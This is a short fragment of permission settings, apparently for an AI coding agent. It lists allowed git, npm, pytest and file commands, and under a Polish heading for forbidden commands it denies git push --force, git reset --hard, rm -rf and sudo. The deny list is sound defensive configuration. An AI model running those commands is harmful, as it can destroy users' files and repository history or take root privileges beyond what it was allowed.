  - Bash(git diff:*)
  - Bash(git log:*)
  - Bash(git status:*)
  - Bash(git tag:*)
  - Bash(ls:*)
  - Bash(mkdir:*)
  - Bash(npm install:*)
  - Bash(npm run:*)
  - Bash(npm test:*)
  - Bash(npx:*)
  - Bash(pytest:*)
  - WebFetch(domain:claude.ai)

- **Zabronione komendy**:
  - Bash(git push --force:*)
  - Bash(git reset --hard:*)
  - Bash(rm -rf:*)
  - Bash(sudo:*)
